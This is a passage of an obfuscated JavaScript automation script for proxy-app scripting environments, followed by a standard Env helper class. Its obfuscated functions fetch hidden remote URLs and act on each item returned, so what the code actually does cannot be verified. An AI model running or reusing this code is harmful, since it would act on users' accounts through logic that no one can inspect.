')],_0x245351[_0x5567('90','Wp)l')])){$[_0x5567('91','ui3l')](_0x598150);}else{$[_0x5567('92','d]b4')](_0x598150);}}finally{_0x245351[_0x5567('93','j*uG')](_0x4ecd79);}});});}function shuye72(){var _0x5e6a23={'KrSUa':function(_0x2ed076){return _0x2ed076();},'puRXb':function(_0x40e565,_0xe1aa0f){return _0x40e565!==_0xe1aa0f;},'Tlbwu':_0x5567('94','hX7P'),'qAygE':_0x5567('95','!fX@'),'SicCH':function(_0x54e1bd,_0x2c02e0){return _0x54e1bd!==_0x2c02e0;},'aSMgy':_0x5567('96','2YGF'),'ENYcb':_0x5567('97',']!#w'),'fAxsx':function(_0x4c09b9){return _0x4c09b9();},'RnOlq':function(_0x3df6a6,_0x41ac1d){return _0x3df6a6===_0x41ac1d;},'Fsywf':_0x5567('98','hX7P'),'jQPWr':function(_0x4e76cc,_0x385b2c){return _0x4e76cc<_0x385b2c;},'Rdlfp':function(_0x1d1038,_0x2e9508){return _0x1d1038(_0x2e9508);},'EycgL':function(_0x54b5d5,_0x227e55){return _0x54b5d5!==_0x227e55;},'OsGfH':_0x5567('99','CUQ0'),'MFgVz':_0x5567('9a','aa*N'),'UJpCk':_0x5567('9b','Wp)l'),'Hpjfm':_0x5567('9c','VLM['),'EAobw':_0x5567('9d','1*lq')};return new Promise(_0x4bea3b=>{var _0x25c25d={'HaHtX':function(_0x4ef950){return _0x5e6a23[_0x5567('9e','2YGF')](_0x4ef950);}};if(_0x5e6a23[_0x5567('9f','gown')](_0x5e6a23[_0x5567('a0','GeVT')],_0x5e6a23[_0x5567('a1','GeVT')])){$[_0x5567('a2','Ona0')]({'url':_0x5e6a23[_0x5567('a3','MZlx')],'headers':{'User-Agent':_0x5e6a23[_0x5567('a4','8k%*')]}},async(_0x221b9b,_0x36c225,_0x38bf8e)=>{var _0x2b1bed={'nghJz':function(_0x2be90b){return _0x5e6a23[_0x5567('a5','YUoN')](_0x2be90b);}};try{if(_0x5e6a23[_0x5567('a6','3E4]')](_0x5e6a23[_0x5567('a7','yDQM')],_0x5e6a23[_0x5567('a8','8k%*')])){if(_0x221b9b){console[_0x5567('a9','2YGF')]($[_0x5567('aa','3E4]')]+_0x5567('ab','y3@e'));}else{if(_0x5e6a23[_0x5567('ac','vxiF')](_0x5e6a23[_0x5567('ad','7Ghe')],_0x5e6a23[_0x5567('ae','4v8#')])){$[_0x5567('af','2YGF')]=JSON[_0x5567('b0','7Ghe')](_0x38bf8e);await _0x5e6a23[_0x5567('b1','y3@e')](shuye73);if(_0x5e6a23[_0x5567('b2','7Ghe')]($[_0x5567('b3','87Se')][_0x5567('b4','GeVT')][_0x5567('b5','OYUb')],0x0)){if(_0x5e6a23[_0x5567('b6','Khio')](_0x5e6a23[_0x5567('b7','l*5U')],_0x5e6a23[_0x5567('b8','OG7t')])){for(let _0x30babc=0x0;_0x5e6a23[_0x5567('b9','j*uG')](_0x30babc,$[_0x5567('ba','i*WK')][_0x5567('bb','n*gF')][_0x5567('bc','Khio')]);_0x30babc++){let _0x1ddb75=$[_0x5567('bd','VSaK')][_0x5567('be','d]b4')][_0x30babc];await $[_0x5567('bf','VLM[')](0x1f4);await _0x5e6a23[_0x5567('c0','yDQM')](wuzhi,_0x1ddb75);}await _0x5e6a23[_0x5567('c1','j*uG')](shuye74);}else{_0x2b1bed[_0x5567('c2','1*lq')](_0x4bea3b);}}}else{if(_0x221b9b){console[_0x5567('88','4v8#')]($[_0x5567('c3','M)mo')]+_0x5567('c4','vxiF'));}else{$[_0x5567('c5','yDQM')]=JSON[_0x5567('c6','Mg6z')](_0x38bf8e);$[_0x5567('10','Mg6z')]=$[_0x5567('c7','CUQ0')][_0x5567('c8','8wGw')];}}}}else{console[_0x5567('c9','MZlx')]($[_0x5567('ca','5UNs')]+_0x5567('cb','ui3l'));}}catch(_0x185537){if(_0x5e6a23[_0x5567('cc','GeVT')](_0x5e6a23[_0x5567('cd','VLM[')],_0x5e6a23[_0x5567('ce','!fX@')])){_0x25c25d[_0x5567('cf','ZiUP')](_0x4bea3b);}else{$[_0x5567('d0','i*WK')](_0x185537);}}finally{_0x5e6a23[_0x5567('d1','kx1p')](_0x4bea3b);}});}else{$[_0x5567('d2','7Ghe')]=JSON[_0x5567('d3','VLM[')](data);$[_0x5567('d4','a0S0')]=$[_0x5567('d5','j*uG')][_0x5567('d6','M)mo')];}});}function shuye73(){var _0xc9d338={'amLfK':function(_0x5f2da8,_0x1c44c1){return _0x5f2da8(_0x1c44c1);},'ENsRo':function(_0x51cd13,_0x430358){return _0x51cd13===_0x430358;},'wKiiT':_0x5567('d7','MZlx'),'ENsmU':function(_0x38c915){return _0x38c915();},'bWohr':_0x5567('d8','JfC*'),'nTjua':_0x5567('d9','EZrr')};return new Promise(_0x401f89=>{var _0x1493a5={'KUIpV':function(_0x20881d,_0x22b3aa){return _0xc9d338[_0x5567('da','n*gF')](_0x20881d,_0x22b3aa);},'BWuQx':function(_0x39ed56,_0x831ae6){return _0xc9d338[_0x5567('db','j*uG')](_0x39ed56,_0x831ae6);},'VmJoA':_0xc9d338[_0x5567('dc','YUoN')],'oHVYv':function(_0x38abc7){return _0xc9d338[_0x5567('dd','1mxf')](_0x38abc7);}};$[_0x5567('de','gown')]({'url':_0xc9d338[_0x5567('df','l*5U')],'headers':{'User-Agent':_0xc9d338[_0x5567('e0','n&Hv')]}},async(_0xf123bd,_0x2a38da,_0x1dbae3)=>{var _0x41e5c0={'XXTPZ':function(_0x34a1ae,_0x17d45f){return _0x1493a5[_0x5567('e1','!fX@')](_0x34a1ae,_0x17d45f);}};try{if(_0xf123bd){console[_0x5567('e2','gown')]($[_0x5567('e3','Mg6z')]+_0x5567('e4','8k%*'));}else{$[_0x5567('e5','i*WK')]=JSON[_0x5567('42','Ona0')](_0x1dbae3);$[_0x5567('e6','5UNs')]=$[_0x5567('e7','VLM[')][_0x5567('e8','!fX@')];}}catch(_0x245364){if(_0x1493a5[_0x5567('e9',']!#w')](_0x1493a5[_0x5567('ea','vxiF')],_0x1493a5[_0x5567('eb','VSaK')])){$[_0x5567('ec','87Se')](_0x245364);}else{if(_0x41e5c0[_0x5567('ed','8wGw')](safeGet,_0x1dbae3)){_0x1dbae3=JSON[_0x5567('38','M)mo')](_0x1dbae3);}}}finally{_0x1493a5[_0x5567('ee','1*lq')](_0x401f89);}});});}function shuye74(){var _0x592763={'NnFiM':function(_0x5374b6){return _0x5374b6();},'qpdzR':function(_0x72c065){return _0x72c065();},'TNWpt':function(_0x45d81d,_0x39d618){return _0x45d81d!==_0x39d618;},'eYzvx':_0x5567('ef','j*uG'),'pPcMm':function(_0x32f55c,_0x125282){return _0x32f55c(_0x125282);},'TZqqs':function(_0x5089d7,_0x1f0411){return _0x5089d7===_0x1f0411;},'KKjUK':_0x5567('f0','gown'),'Dmhzd':_0x5567('f1','8k%*'),'nmbVQ':function(_0x57ea61,_0x89171f){return _0x57ea61!==_0x89171f;},'kpkKS':_0x5567('f2','gown'),'JnhrK':function(_0x47180a,_0x3185f8){return _0x47180a<_0x3185f8;},'dcMpO':_0x5567('f3','OG7t'),'HCKvQ':_0x5567('f4','VSaK'),'LcPmy':_0x5567('f5','CUQ0'),'FVyqF':_0x5567('f6',']!#w'),'hBIFK':function(_0x51962d,_0x3aee45){return _0x51962d===_0x3aee45;},'bGYiV':_0x5567('f7','LY*5'),'CRfED':_0x5567('f8','vxiF'),'dSiEH':_0x5567('f9','kx1p'),'GOAdX':_0x5567('fa','y3@e')};return new Promise(_0x4c4337=>{if(_0x592763[_0x5567('fb','CUQ0')](_0x592763[_0x5567('fc','i*WK')],_0x592763[_0x5567('fd','EZrr')])){_0x592763[_0x5567('fe','87Se')](_0x4c4337);}else{$[_0x5567('ff','hX7P')]({'url':_0x592763[_0x5567('100','TS]C')],'headers':{'User-Agent':_0x592763[_0x5567('101','d]b4')]}},async(_0x168a25,_0x23738c,_0x1257f6)=>{var _0x1aef45={'ByxJH':function(_0x1be19d){return _0x592763[_0x5567('102','GeVT')](_0x1be19d);}};try{if(_0x592763[_0x5567('103','aa*N')](_0x592763[_0x5567('104','d]b4')],_0x592763[_0x5567('105','5UNs')])){$[_0x5567('92','d]b4')](e);}else{if(_0x168a25){console[_0x5567('106','ui3l')]($[_0x5567('107','VCBi')]+_0x5567('108','nanY'));}else{if(_0x592763[_0x5567('109','TS]C')](safeGet,_0x1257f6)){if(_0x592763[_0x5567('10a','nanY')](_0x592763[_0x5567('10b','3jX@')],_0x592763[_0x5567('10c','N9jr')])){console[_0x5567('106','ui3l')]($[_0x5567('89','!fX@')]+_0x5567('c4','vxiF'));}else{$[_0x5567('10d','1*lq')]=JSON[_0x5567('c6','Mg6z')](_0x1257f6);if(_0x592763[_0x5567('10e','n*gF')]($[_0x5567('10f','Ona0')][_0x5567('110','n&Hv')],0x0)){if(_0x592763[_0x5567('111','3jX@')](_0x592763[_0x5567('112','n&Hv')],_0x592763[_0x5567('113','vxiF')])){_0x1aef45[_0x5567('114','2YGF')](_0x4c4337);}else{for(let _0x52344d=0x0;_0x592763[_0x5567('115','aa*N')](_0x52344d,$[_0x5567('116','l*5U')][_0x5567('117','kx1p')][_0x5567('118','87Se')]);_0x52344d++){let _0x3a445d=$[_0x5567('119','!fX@')][_0x5567('11a','3E4]')][_0x52344d];await $[_0x5567('11b','j*uG')](0x1f4);await _0x592763[_0x5567('11c','87Se')](wuzhi01,_0x3a445d);}}}}}}}}catch(_0x937b37){if(_0x592763[_0x5567('11d','4v8#')](_0x592763[_0x5567('11e','2YGF')],_0x592763[_0x5567('11f','MZlx')])){$[_0x5567('120','N9jr')](_0x937b37);}else{_0x1aef45[_0x5567('121','8k%*')](_0x4c4337);}}finally{if(_0x592763[_0x5567('122','OYUb')](_0x592763[_0x5567('123','a0S0')],_0x592763[_0x5567('124','j*uG')])){if(_0x168a25){console[_0x5567('125','EZrr')]($[_0x5567('126','y3@e')]+_0x5567('127','!fX@'));}else{_0x1257f6=JSON[_0x5567('128','j*uG')](_0x1257f6);}}else{_0x592763[_0x5567('129','N9jr')](_0x4c4337);}}});}});};_0xode='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}